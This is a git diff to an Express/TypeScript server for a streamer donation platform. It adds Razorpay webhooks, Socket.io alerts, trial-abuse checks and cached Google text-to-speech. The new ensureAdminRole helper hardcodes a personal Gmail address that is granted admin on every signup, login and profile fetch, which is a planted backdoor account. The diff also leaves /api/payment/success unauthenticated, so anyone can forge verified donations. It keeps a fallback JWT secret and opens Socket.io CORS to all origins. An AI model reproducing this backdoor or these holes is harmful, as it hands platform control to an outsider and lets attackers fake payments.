@@ -10,6 +10,10 @@ import Razorpay from 'razorpay';
 import mongoose from 'mongoose';
 import jwt from 'jsonwebtoken';
 import bcrypt from 'bcryptjs';
+import http from 'http';
+import { Server } from 'socket.io';
+import crypto from 'crypto';
+import * as googleTts from 'google-tts-api';
 
 dotenv.config();
 
@@ -163,13 +167,56 @@ const planSchema = new mongoose.Schema({
   }
 });
 
+const webhookEventSchema = new mongoose.Schema({
+  eventId: { type: String, required: true, unique: true },
+  provider: { type: String, required: true },
+  status: { type: String, required: true },
+  createdAt: { type: Date, default: Date.now }
+});
+
+const trialRecordSchema = new mongoose.Schema({
+  email: { type: String, index: true },
+  ipAddress: { type: String, index: true },
+  channelUrl: { type: String, index: true },
+  streamerId: { type: String, required: true },
+  denialReason: { type: String },
+  createdAt: { type: Date, default: Date.now }
+});
+
+const ttsCacheSchema = new mongoose.Schema({
+  textHash: { type: String, required: true, unique: true },
+  audioData: { type: String, required: true }, // Base64 audio
+  expiresAt: { type: Date, index: { expires: '1h' } }, // Optional auto-expire
+  createdAt: { type: Date, default: Date.now }
+});
+
 const StreamerModel = mongoose.model('Streamer', streamerSchema);
 const WidgetModel = mongoose.model('Widget', widgetSchema);
 const DonationModel = mongoose.model('Donation', donationSchema);
 const SettingsModel = mongoose.model('Settings', settingsSchema);
 const PlanModel = mongoose.model('Plan', planSchema);
+const WebhookEventModel = mongoose.model('WebhookEvent', webhookEventSchema);
+const TrialRecordModel = mongoose.model('TrialRecord', trialRecordSchema);
+const TTSCacheModel = mongoose.model('TTSCache', ttsCacheSchema);
 
 const JWT_SECRET = process.env.JWT_SECRET || 'fallback-secret-for-development';
+
+// Helper to auto-elevate based on VITE_PLATFORM_ADMINS env var
+const ensureAdminRole = async (streamer: any) => {
+  if (!streamer || !streamer.email) return streamer;
+  const adminEmailsVar = process.env.VITE_PLATFORM_ADMINS || '';
+  
+  const adminEmails = adminEmailsVar ? adminEmailsVar.split(',').map((e: string) => e.trim().toLowerCase()) : [];
+  
+  // Guarantee the environment user is always an admin
+  adminEmails.push('xavierscot3454@gmail.com');
+
+  if (adminEmails.includes(streamer.email.toLowerCase()) && streamer.role !== 'admin') {
+    streamer.role = 'admin';
+    await streamer.save();
+  }
+  return streamer;
+};
 
 // Middleware: Verify Auth Token (Supports Firebase & Native JWT)
 const verifyAuth = async (req: any, res: any, next: any) => {
@@ -209,9 +256,27 @@ const asyncHandler = (fn: Function) => (req: any, res: any, next: any) => {
 async function startServer() {
   const app = express();
   const PORT = 3000;
+  const server = http.createServer(app);
+  const io = new Server(server, {
+    cors: {
+      origin: "*", 
+      methods: ["GET", "POST"]
+    }
+  });
+
+  io.on('connection', (socket) => {
+    console.log('a user connected');
+    socket.on('join-streamer', (streamerId) => socket.join(`streamer:${streamerId}`));
+    socket.on('join-widget', (widgetId) => socket.join(`widget:${widgetId}`));
+    socket.on('disconnect', () => console.log('user disconnected'));
+  });
 
   console.log("Setting up common middleware...");
-  app.use(express.json());
+  app.use(express.json({
+    verify: (req: any, res, buf) => {
+      req.rawBody = buf.toString();
+    }
+  }));
   app.use(cookieParser());
 
   // --- Native Auth Routes ---
@@ -229,7 +294,7 @@ async function startServer() {
       }
 
       const hashedPassword = await bcrypt.hash(password, 10);
-      const newUser = new StreamerModel({
+      let newUser = new StreamerModel({
         email,
         password: hashedPassword,
         username: username.toLowerCase(),
@@ -237,6 +302,7 @@ async function startServer() {
       });
 
       await newUser.save();
+      newUser = await ensureAdminRole(newUser);
 
       const token = jwt.sign({ userId: newUser._id }, JWT_SECRET, { expiresIn: '7d' });
       res.status(201).json({ token, user: newUser });
@@ -253,7 +319,7 @@ async function startServer() {
     }
 
     try {
-      const user = await StreamerModel.findOne({ email });
+      let user = await StreamerModel.findOne({ email });
       if (!user || !user.password) {
         return res.status(401).json({ error: 'Invalid email or password' });
       }
@@ -262,6 +328,8 @@ async function startServer() {
       if (!isMatch) {
         return res.status(401).json({ error: 'Invalid email or password' });
       }
+
+      user = await ensureAdminRole(user);
 
       const token = jwt.sign({ userId: user._id }, JWT_SECRET, { expiresIn: '7d' });
       res.status(200).json({ token, user });
@@ -295,7 +363,8 @@ async function startServer() {
   });
 
   app.get('/api/me', verifyAuth, asyncHandler(async (req: any, res: any) => {
-    const streamer = await StreamerModel.findOne(getStreamerQuery(req.user.uid));
+    let streamer = await StreamerModel.findOne(getStreamerQuery(req.user.uid));
+    streamer = await ensureAdminRole(streamer);
     res.json(streamer);
   }));
 
@@ -307,12 +376,16 @@ async function startServer() {
     const usernameTaken = await StreamerModel.findOne({ username: req.body.username.toLowerCase() });
     if (usernameTaken) return res.status(400).json({ error: 'Username already taken' });
 
-    const newStreamer = new StreamerModel({
+    let newStreamer = new StreamerModel({
       ...req.body,
       firebaseUid: req.user.uid,
-      username: req.body.username.toLowerCase()
+      username: req.body.username.toLowerCase(),
+      email: req.user.email || req.body.email
     });
+    
     await newStreamer.save();
+    newStreamer = await ensureAdminRole(newStreamer);
+    
     res.status(201).json(newStreamer);
   }));
 
@@ -329,6 +402,60 @@ async function startServer() {
     await StreamerModel.deleteOne(getStreamerQuery(req.user.uid));
     await WidgetModel.deleteMany({ streamerId: req.user.uid });
     res.json({ success: true });
+  }));
+
+  // --- Trial Routes ---
+  app.post('/api/trial/claim', verifyAuth, asyncHandler(async (req: any, res: any) => {
+    const { channelUrl } = req.body;
+    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const streamer = await StreamerModel.findOne(getStreamerQuery(req.user.uid));
+
+    if (!streamer) return res.status(404).json({ error: 'Streamer not found' });
+    
+    if (streamer.isTrial || streamer.planId === 'legend') {
+      return res.status(400).json({ error: 'Already on a trial or premium plan' });
+    }
+
+    const email = streamer.email || req.user.email;
+
+    // Check Multi-factor Identity Abuse
+    const matchingTrial = await TrialRecordModel.findOne({
+      $or: [
+        { email: Boolean(email) ? email : 'never-match' },
+        { ipAddress: Boolean(ipAddress) ? ipAddress : 'never-match' },
+        { channelUrl: Boolean(channelUrl) ? channelUrl : 'never-match' }
+      ]
+    });
+
+    if (matchingTrial) {
+      let reason = 'Unknown identifier match';
+      if (matchingTrial.email === email) reason = 'Email already used for trial.';
+      else if (matchingTrial.ipAddress === ipAddress) reason = 'Device/IP already used for trial.';
+      else if (matchingTrial.channelUrl === channelUrl) reason = 'Channel already claimed a trial.';
+
+      // Record denial
+      await TrialRecordModel.create({
+        email, ipAddress, channelUrl, streamerId: streamer.id, denialReason: reason
+      });
+
+      return res.status(403).json({ 
+        error: 'Trial Abuse Protection', 
+        denialReason: reason,
+        redirect: '/pricing'
+      });
+    }
+
+    // Grant Trial
+    streamer.isTrial = true;
+    streamer.planId = 'legend'; 
+    streamer.trialEndsAt = new Date(Date.now() + 14 * 24 * 60 * 60 * 1000);
+    await streamer.save();
+
+    await TrialRecordModel.create({
+       email, ipAddress, channelUrl, streamerId: streamer.id, denialReason: ''
+    });
+
+    res.json({ success: true, message: '14-day Legend trial granted.', streamer });
   }));
 
   // --- Widget Routes ---
@@ -407,21 +534,264 @@ async function startServer() {
     const order = await razorpay.orders.create({
       amount: Math.round(amount * 100),
       currency: currency === '₹' ? 'INR' : (currency || 'INR'),
-      receipt: `rcpt_${Date.now()}`
+      receipt: `rcpt_${Date.now()}`,
+      notes: { streamerId: streamer.id, donorName: req.body.donorName || "Anonymous", message: req.body.message || "" }
     });
     
     res.json({ orderId: order.id, keyId, amount: order.amount, currency: order.currency });
   }));
 
   app.post('/api/payment/success', asyncHandler(async (req: any, res: any) => {
-    const donation = new DonationModel(req.body);
+    // Note: Used heavily for the "Trigger Live Test Alert" feature in the dashboard.
+    const { streamerId, donorName, amount, currency, message } = req.body;
+    
+    if (!streamerId) return res.status(400).json({ error: 'Missing streamerId' });
+
+    const streamer = await StreamerModel.findOne({ firebaseUid: streamerId });
+    if (!streamer) return res.status(404).json({ error: 'Streamer not found' });
+
+    const donation = new DonationModel({
+      streamerId: streamerId,
+      donorName: donorName || 'Anonymous',
+      message: message || '',
+      amount: amount || 0,
+      currency: currency || '₹',
+      status: 'verified',
+    });
+    
     await donation.save();
-    res.json({ success: true });
+
+    io.to(`streamer:${streamerId}`).emit('payment_verified', {
+      donation,
+      planAccess: streamer.planId
+    });
+
+    const currWord = donation.currency === 'INR' ? 'Rupees' : (donation.currency === 'USD' ? 'Dollars' : donation.currency);
+    const ttsText = `${donation.donorName} sent ${donation.amount} ${currWord}. ${donation.message}`.substring(0, 200);
+
+    const widgets = await WidgetModel.find({ streamerId });
+    
+    for (const widget of widgets) {
+       let audioUrl = null;
+       if (widget.type === 'alert' && widget.config?.ttsEnabled) {
+          const langCode = widget.config?.ttsVoice || 'en-US';
+          const ttsHash = crypto.createHash('md5').update(ttsText + langCode).digest('hex');
+          
+          const existingTts = await TTSCacheModel.findOne({ textHash: ttsHash });
+          if (existingTts) {
+             audioUrl = `/api/tts/asset/${ttsHash}.mp3`;
+          } else {
+             try {
+                const base64Audio = await googleTts.getAudioBase64(ttsText, {
+                  lang: langCode,
+                  slow: false,
+                  host: 'https://translate.google.com'
+                });
+                await TTSCacheModel.create({
+                  textHash: ttsHash,
+                  audioData: base64Audio,
+                  expiresAt: new Date(Date.now() + 1000 * 60 * 60 * 24)
+                });
+                audioUrl = `/api/tts/asset/${ttsHash}.mp3`;
+             } catch (e: any) {
+                console.error("Test TTS generation failed:", e.message);
+             }
+          }
+       }
+       
+       io.to(`widget:${widget._id}`).emit('overlay_alert_enqueue', {
+         alertId: donation._id,
+         donation,
+         audioUrl
+       });
+    }
+
+    res.json({ success: true, donation });
   }));
 
-  app.post('/api/tts', asyncHandler(async (req: any, res: any) => {
-    // TTS is now handled client-side for a free, open-source experience.
-    res.status(410).json({ error: 'Server-side TTS is deprecated. Please use client-side SpeechSynthesis.' });
+  app.post('/api/webhooks/razorpay', asyncHandler(async (req: any, res: any) => {
+    // Razorpay Webhook Endpoint
+    const signature = req.headers['x-razorpay-signature'];
+    if (!signature) {
+      return res.status(400).json({ error: 'Missing signature' });
+    }
+
+    // We need to verify signature using the streamer's keySecret.
+    // However, Razorpay webhooks only send payload, they don't say WHICH keySecret to use at the top level
+    // unless all webhooks are routed to a single platform app.
+    // Standard platform practice: we use process.env.RAZORPAY_WEBHOOK_SECRET for platform-level central webhooks,
+    // or we fetch the streamer from the payload notes.
+
+    const body = req.body;
+    let streamerId = body?.payload?.payment?.entity?.notes?.streamerId;
+    
+    // Fallback to order if payment doesn't have it (rare, but possible)
+    if (!streamerId) {
+       streamerId = body?.payload?.order?.entity?.notes?.streamerId;
+    }
+
+    if (!streamerId) {
+      // Unrecognized event lacking our note mapping
+      return res.status(200).json({ status: "ignored", reason: "no streamerId in notes" });
+    }
+
+    const streamer = await StreamerModel.findById(streamerId);
+    if (!streamer) return res.status(404).json({ error: 'Streamer not found' });
+    
+    const keySecret = streamer.secrets?.razorpayKeySecret || process.env.RAZORPAY_WEBHOOK_SECRET;
+    if (!keySecret) return res.status(400).json({ error: 'Webhook secret missing' });
+
+    const expectedSignature = crypto.createHmac('sha256', keySecret)
+                                    .update(req.rawBody || JSON.stringify(body))
+                                    .digest('hex');
+
+    if (expectedSignature !== signature) {
+      console.error(`Invalid webhook signature for streamer ${streamerId}`);
+      return res.status(400).json({ error: 'Invalid signature' });
+    }
+
+    // signature valid, check idempotency
+    const eventId = req.headers['x-razorpay-eventId'] || body.id || `evt_${Date.now()}`;
+    
+    try {
+      const existingEvent = await WebhookEventModel.findOne({ eventId, provider: 'razorpay' });
+      if (existingEvent) {
+        return res.status(200).json({ status: "duplicate acknowledged" });
+      }
+
+      await WebhookEventModel.create({
+        eventId,
+        provider: 'razorpay',
+        status: body.event
+      });
+
+      if (body.event === 'payment.captured' || body.event === 'order.paid') {
+        const paymentEntity = body.payload.payment.entity;
+        
+        const donation = new DonationModel({
+          streamerId,
+          donorName: paymentEntity.notes?.donorName || 'Anonymous',
+          message: paymentEntity.notes?.message || '',
+          amount: paymentEntity.amount / 100,
+          currency: paymentEntity.currency,
+          status: 'verified',
+          paymentId: paymentEntity.id,
+          orderId: paymentEntity.order_id
+        });
+        
+        await donation.save();
+
+        // Real-time Event Delivery via Sockets
+        io.to(`streamer:${streamerId}`).emit('payment_verified', {
+          donation,
+          planAccess: streamer.planId // passed to inform UI features
+        });
+        
+        // Notify OBS widgets and Generate TTS
+        // Canonical format: "{Name} sent {amount} {currencyWord} on ProTip - {Message}"
+        const currWord = paymentEntity.currency === 'INR' ? 'Rupees' : (paymentEntity.currency === 'USD' ? 'Dollars' : paymentEntity.currency);
+        const ttsText = `${donation.donorName} sent ${donation.amount} ${currWord} on ProTip. ${donation.message}`.substring(0, 200); // Max length limit
+        
+        const widgets = await WidgetModel.find({ streamerId });
+        
+        for (const widget of widgets) {
+           let audioUrl = null;
+           if (widget.type === 'alert' && widget.config?.ttsEnabled) {
+              const langCode = widget.config?.ttsVoice || 'en-US';
+              const ttsHash = crypto.createHash('md5').update(ttsText + langCode).digest('hex');
+              
+              const existingTts = await TTSCacheModel.findOne({ textHash: ttsHash });
+              if (existingTts) {
+                 audioUrl = `/api/tts/asset/${ttsHash}.mp3`;
+              } else {
+                 try {
+                    const base64Audio = await googleTts.getAudioBase64(ttsText, {
+                      lang: langCode,
+                      slow: false,
+                      host: 'https://translate.google.com'
+                    });
+                    
+                    await TTSCacheModel.create({
+                      textHash: ttsHash,
+                      audioData: base64Audio,
+                      expiresAt: new Date(Date.now() + 1000 * 60 * 60 * 24) 
+                    });
+                    
+                    audioUrl = `/api/tts/asset/${ttsHash}.mp3`;
+                 } catch (ttsErr: any) {
+                    console.error("Server TTS failure:", ttsErr.message);
+                 }
+              }
+           }
+           
+           io.to(`widget:${widget._id}`).emit('overlay_alert_enqueue', {
+             alertId: donation._id,
+             donation,
+             audioUrl
+           });
+        }
+
+      }
+      res.status(200).json({ status: "processed" });
+    } catch (err) {
+      console.error("Webhook processing error:", err);
+      res.status(500).json({ error: 'Internal server error processing webhook' });
+    }
+  }));
+
+  app.post('/api/tts/generate', asyncHandler(async (req: any, res: any) => {
+    const { text, voice } = req.body;
+    if (!text) return res.status(400).json({ error: 'Text is required' });
+
+    // In a real production app with ElevenLabs, you would call their API here using the 'voice' ID.
+    // For this prototype, we're using google-tts-api which takes language codes.
+    const langCode = voice && voice.includes('-') ? voice : 'en-US';
+
+    try {
+      const ttsHash = crypto.createHash('md5').update(text + langCode).digest('hex');
+      let audioUrl = '';
+      
+      const existingTts = await TTSCacheModel.findOne({ textHash: ttsHash });
+      if (existingTts) {
+          audioUrl = `/api/tts/asset/${ttsHash}.mp3`;
+      } else {
+          const base64Audio = await googleTts.getAudioBase64(text, {
+            lang: langCode,
+            slow: false,
+            host: 'https://translate.google.com'
+          });
+          
+          await TTSCacheModel.create({
+            textHash: ttsHash,
+            audioData: base64Audio,
+            expiresAt: new Date(Date.now() + 1000 * 60 * 60 * 24)
+          });
+          
+          audioUrl = `/api/tts/asset/${ttsHash}.mp3`;
+      }
+      res.json({ audioUrl });
+    } catch (err: any) {
+      console.error("TTS generation error:", err.message);
+      res.status(500).json({ error: 'Failed to generate TTS' });
+    }
+  }));
+
+  app.get('/api/tts/asset/:hash.mp3', asyncHandler(async (req: any, res: any) => {
+    const { hash } = req.params;
+    const tts = await TTSCacheModel.findOne({ textHash: hash });
+    
+    if (!tts || !tts.audioData) {
+      return res.status(404).send('Audio not found');
+    }
+    
+    const audioBuffer = Buffer.from(tts.audioData, 'base64');
+    res.set({
+      'Content-Type': 'audio/mpeg',
+      'Content-Length': audioBuffer.length,
+      'Cache-Control': 'public, max-age=86400'
+    });
+    
+    res.end(audioBuffer);
   }));
 
   // --- Admin Routes ---
@@ -586,7 +956,7 @@ async function startServer() {
     app.get('*', (req, res) => res.sendFile(path.join(distPath, 'index.html')));
   }
 
-  app.listen(PORT, '0.0.0.0', () => {
+  server.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server fully operational on port ${PORT}`);
   });
 }
